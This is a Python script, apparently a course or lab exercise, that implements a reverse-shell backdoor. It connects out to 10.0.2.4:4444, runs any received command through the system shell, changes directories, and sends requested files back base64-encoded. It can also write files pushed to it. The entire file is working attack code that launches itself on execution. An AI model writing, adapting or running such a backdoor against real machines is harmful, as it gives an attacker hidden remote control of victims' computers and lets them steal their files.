#!/usr/bin/env python
# https://docs.python.org/2/library/socket.html
# https://www.tutorialspoint.com/python/python_networking.htm
import base64
import json
import os
import socket
import subprocess

import chardet


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                byte_data = self.connection.recv(1024)
                json_data = json_data + self.decode(byte_data)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except Exception:
            return "Could not execute command: " + " ".join(command)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def send_file(self, path):
        file = self.read_file(path)
        print("[+] Sending file...")
        self.connection.sendall(file)

        eof = base64.b64encode(b"pp-00-11-22-ff")
        print(b"pp-00-11-22-ff")
        print("[+] Sending EOF flag...", eof)
        self.connection.send(eof)

    def read_file(self, path):
        with open(path, "rb") as file:
            read_file = file.read()
            print("[+] Reading file is complete. File size: " + str(len(read_file)))
            encode = base64.b64encode(read_file)
            # print(encode)
            return encode

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download" and len(command) > 1:
                self.send_file(command[1])
                continue
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(self.decode(command_result))
        self.connection.close()

    def decode(self, data):
        try:
            encoding = chardet.detect(data)['encoding']
            return data.decode(encoding)
        except (UnicodeDecodeError, AttributeError, TypeError):
            return data


my_backdoor = Backdoor("10.0.2.4", 4444)
my_backdoor.run()
